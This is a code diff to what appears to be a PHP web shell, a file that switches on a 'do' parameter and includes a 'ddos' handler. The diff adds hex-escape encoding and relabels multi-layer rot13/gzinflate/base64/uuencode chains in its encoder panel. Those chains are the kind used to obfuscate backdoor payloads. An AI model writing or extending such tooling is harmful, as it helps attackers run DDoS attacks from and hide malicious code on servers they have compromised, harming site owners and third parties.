@@ -1201,6 +1201,28 @@ elseif ($_GET['do'] == 'ddos') {
 elseif ($_GET['do'] == 'endecode') {
 @ini_set("display_errors", 0);
 @ini_set("output_buffering", 0);
+function hex_escape_encode($str) {
+    $encoded = '';
+    for ($i = 0; $i < strlen($str); $i++) {
+        $encoded .= '\x' . bin2hex($str[$i]);
+    }
+    return $encoded;
+}
+
+function hex_escape_decode($str) {
+    $decoded = '';
+    $parts = explode('\x', $str);
+    foreach ($parts as $part) {
+        if (strlen($part) == 2 && ctype_xdigit($part)) {
+            $decoded .= hex2bin($part);
+        } elseif (!empty($part)) {
+            // If it's not a valid hex escape, append it as is
+            $decoded .= $part;
+        }
+    }
+    return $decoded;
+}
+
 function safe_gzinflate($data) {
     $decoded = @gzinflate($data);
     if ($decoded === false) {
@@ -1236,10 +1258,11 @@ if (isset($_POST["encd"])) {
             <option value="str_rot13_gzinflate_base64" <?php echo ($selected_method == "str_rot13_gzinflate_base64") ? "selected" : ""; ?>>Str_rot13 - Gzinflate - Base64</option>
             <option value="gzinflate_str_rot13_base64" <?php echo ($selected_method == "gzinflate_str_rot13_base64") ? "selected" : ""; ?>>Gzinflate - Str_rot13 - Base64</option>
             <option value="gzinflate_str_rot13_gzinflate_base64" <?php echo ($selected_method == "gzinflate_str_rot13_gzinflate_base64") ? "selected" : ""; ?>>Gzinflate - Str_rot13 - Gzinflate - Base64</option>
-            <option value="complex_chain_1" <?php echo ($selected_method == "complex_chain_1") ? "selected" : ""; ?>>Complex Chain 1</option>
-            <option value="complex_chain_2" <?php echo ($selected_method == "complex_chain_2") ? "selected" : ""; ?>>Complex Chain 2</option>
-            <option value="complex_chain_3" <?php echo ($selected_method == "complex_chain_3") ? "selected" : ""; ?>>Complex Chain 3 (New)</option>
+            <option value="complex_chain_1" <?php echo ($selected_method == "complex_chain_1") ? "selected" : ""; ?>>Str_rot13 - Gzinflate - Str_rot13 - Base64</option>
+            <option value="complex_chain_2" <?php echo ($selected_method == "complex_chain_2") ? "selected" : ""; ?>>Base64 - Gzinflate - Str_rot13 - Convert_UU - Gzinflate - Base64</option>
+            <option value="complex_chain_3" <?php echo ($selected_method == "complex_chain_3") ? "selected" : ""; ?>>Str_rot13 - URL - Convert_UU - Gzinflate - Str_rot13 - Base64 - Convert_UU - Gzinflate - URL - Str_rot13 - Gzinflate - Base64</option>
             <option value="hex" <?php echo ($selected_method == "hex") ? "selected" : ""; ?>>Hex</option>
+            <option value="hex_escaping" <?php echo ($selected_method == "hex_escaping") ? "selected" : ""; ?>>Hex Escaping</option>
             <option value="str_rot13" <?php echo ($selected_method == "str_rot13") ? "selected" : ""; ?>>ROT13 Hash</option>
             <option value="htmlspecialchars" <?php echo ($selected_method == "htmlspecialchars") ? "selected" : ""; ?>>HTML Special Chars</option>
             <option value="addslashes" <?php echo ($selected_method == "addslashes") ? "selected" : ""; ?>>Add Slashes</option>
@@ -1305,9 +1328,12 @@ if (!empty($action) && !empty($text)) {
                 $output = str_rot13(rawurldecode(convert_uudecode(safe_gzinflate(str_rot13(base64_decode(convert_uudecode(safe_gzinflate(rawurldecode(str_rot13(safe_gzinflate(base64_decode($text))))))))))));
             }
             break;
-        case 'hex':
-            $output = ($action == 'encode') ? bin2hex($text) : hex2bin($text);
-            break;
+case 'hex':
+	            $output = ($action == 'encode') ? bin2hex($text) : hex2bin($text);
+	            break;
+	        case 'hex_escaping':
+	            $output = ($action == 'encode') ? hex_escape_encode($text) : hex_escape_decode($text);
+	            break;
         case 'str_rot13':
             $output = str_rot13($text);
             break;
